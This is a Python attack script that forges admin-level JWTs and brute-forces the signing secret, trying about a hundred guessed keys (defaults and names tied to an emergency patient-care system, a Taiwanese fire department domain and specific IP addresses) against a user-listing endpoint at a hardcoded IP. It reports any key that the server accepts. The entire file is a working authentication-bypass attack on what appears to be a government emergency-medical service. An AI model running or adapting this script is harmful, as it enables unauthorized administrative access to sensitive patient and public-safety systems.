import requests, urllib3, base64, hashlib, hmac, json, time
urllib3.disable_warnings()
S=requests.Session(); S.verify=False
UA={"User-Agent":"Mozilla/5.0"}
def b64u(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")
def b64d(s):
    s+= "="*(-len(s)%4); return base64.urlsafe_b64decode(s)
def forge(secret, payload):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")).encode())
    p=b64u(json.dumps(payload,separators=(",",":")).encode())
    sig=hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64u(sig)}"
now=int(time.time())
payload={"user":{"account":"admin","role":"admin","name":"Admin","id":1,"disabled":False},
         "permissions":["*"],"iat":now,"exp":now+7200}
secrets=["secret","jwt","jwt_secret","jwtsecret","jwt-secret","secretkey","secret_key",
"keyboard cat","supersecret","mysecret","password","admin","123456","changeme","test",
"EPCR","epcr","EPCRServer","epcrserver","HospitalServer","hospitalserver","AuthServer","authserver",
"VitalSignVideoServer","vitalsignvideoserver","VitalSignServer","doctorServer","monitorServer",
"mciServer","printServer","merServer","mer2","MerBridge","tpf","TPF","tpf.gov.tw","epcr.tpf.gov.tw",
"FireDepartment","fire_department","消防局","消防","政府機關","市政府","118.163.107.93",
"118.163.107.91","118.163.107.92","35.234.50.28","1.5.24948","24948","epcr2019","EPCR2019",
"EPCR@2019","EPCR123","epcr123","node","express","angular","mongodb","mongo","angularjs",
"ePCr","ePcR","Epcr","auth","token","auth_token","jwt_secret_key","signing_key","signingkey",
"epcr-secret","EPCR-secret","hospital","hospital_system","EMR","EMRServer","mer","MER","ambulance",
"123456789","000000","abcd1234","qwerty","letmein","password123","admin123","root","toor",
"supersecret123","mysecret123","epcr_secret_key","epcr_signing_key","jwt_key","secretkey123"]
endpoints=["/Users","/Roles","/Users?offset=0&count=1"]
print(f"Testing {len(secrets)} secrets against {endpoints[0]} on staging AuthServer...")
hits=[]
for base in ["http://35.234.50.28:3400"]:
    for sec in secrets:
        tok=forge(sec,payload)
        hdrs=dict(UA); hdrs["Authorization"]="Bearer "+tok
        try:
            r=S.get(base+"/Users",headers=hdrs,timeout=8)
            if r.status_code!=401:
                hits.append((sec,r.status_code,r.text[:80]))
                print(f"  *** HIT secret={sec!r} -> {r.status_code} :: {r.text[:80]!r}")
        except Exception as ex:
            print(f"  [ERR] {sec!r} {type(ex).__name__}")
print(f"\nNon-401 hits: {len(hits)}")
if not hits: print("No secret produced a valid signature (all 401).")
print("done")
